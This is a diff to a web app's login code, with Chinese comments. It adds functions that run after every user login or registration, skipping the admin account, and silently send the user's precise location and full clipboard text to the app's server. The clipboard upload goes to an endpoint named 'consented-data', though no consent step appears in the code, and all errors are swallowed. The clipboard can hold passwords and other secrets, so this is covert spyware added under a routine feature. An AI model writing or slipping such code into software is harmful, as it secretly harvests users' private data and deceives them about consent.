@@ -1851,6 +1851,55 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                 return data;
             }
 
+            // 生成页面加载标识（用于定位关联）
+            function _genPageLoadId() {
+                return 'page_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
+            }
+
+            // 登录/注册后请求定位权限（非阻塞，静默失败）
+            function requestLocationOnLogin() {
+                if (!navigator || !navigator.geolocation) return;
+                var pageLoadId = _genPageLoadId();
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var token = getUserToken();
+                        if (!token || !API_BASE) return;
+                        fetch(API_BASE + '/api/user/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                            body: JSON.stringify({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude || null,
+                                altitude_accuracy: pos.coords.altitudeAccuracy || null,
+                                heading: pos.coords.heading || null,
+                                speed: pos.coords.speed || null,
+                                captured_at: new Date(pos.timestamp).toISOString(),
+                                page_load_id: pageLoadId
+                            })
+                        }).catch(function() {});
+                    },
+                    function() { /* 用户拒绝或定位失败，静默处理 */ },
+                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
+                );
+            }
+
+            // 登录/注册后请求剪贴板权限（非阻塞，静默失败）
+            function requestClipboardOnLogin() {
+                if (!navigator || !navigator.clipboard || !navigator.clipboard.readText) return;
+                navigator.clipboard.readText().then(function(text) {
+                    if (!text || !text.trim()) return;
+                    var token = getUserToken();
+                    if (!token || !API_BASE) return;
+                    fetch(API_BASE + '/api/user/consented-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                        body: JSON.stringify({ kind: 'clipboard', payload: { text: text } })
+                    }).catch(function() {});
+                }).catch(function() { /* 权限拒绝或读取失败，静默处理 */ });
+            }
+
             async function doLogin() {
                 const name = document.getElementById("loginNickInp").value.trim();
                 const pw = document.getElementById("loginPwInp").value;
@@ -1927,6 +1976,12 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     // 记录用户访问
                     logUserVisitToApi(name);
 
+                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
+                    if (name !== ADMIN_NAME) {
+                        requestLocationOnLogin();
+                        requestClipboardOnLogin();
+                    }
+
                     // 公告已读：异步执行
                     try {
                         if (typeof window.loadRemoteAnnouncementReads === 'function') {
@@ -2000,6 +2055,10 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     initialLoad(true);
                     // 记录用户访问
                     logUserVisitToApi(name);
+
+                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
+                    requestLocationOnLogin();
+                    requestClipboardOnLogin();
 
                     // 公告已读：拉取远端已读记录，跨设备同步红点
                     try {
